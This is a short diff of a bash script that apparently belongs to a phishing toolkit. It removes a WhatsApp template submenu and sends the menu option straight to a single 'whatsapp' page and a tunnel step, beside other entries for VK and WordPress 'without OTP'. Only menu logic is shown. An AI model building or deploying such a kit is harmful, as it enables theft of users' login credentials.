@@ -616,7 +616,8 @@ case $reply in
 	58)
                 site_vk;;
         59)
-                site_whatsapp;;
+                website="whatsapp"
+                tunnel_menu;;
 	60)
                 site_wordpress;;
         61)
@@ -1553,25 +1554,7 @@ case $choice in
                         { sleep 1; banner; site_vk; };;
 esac
 }
-#whatsapp
-site_whatsapp(){
-echo -e "${BLUE}[01]${CYAN} Template 1 ${NC}"
-echo -e "${BLUE}[02]${CYAN} Template 2 ${NC}"
-echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
 
-case $choice in
-        1 | 01)
-                website="whatsapp"
-                tunnel_menu;;
-        2 | 02)
-                website="whatsapp2"
-                tunnel_menu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_whatsapp; };;
-esac
-}
 #wordpress
 site_wordpress(){
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
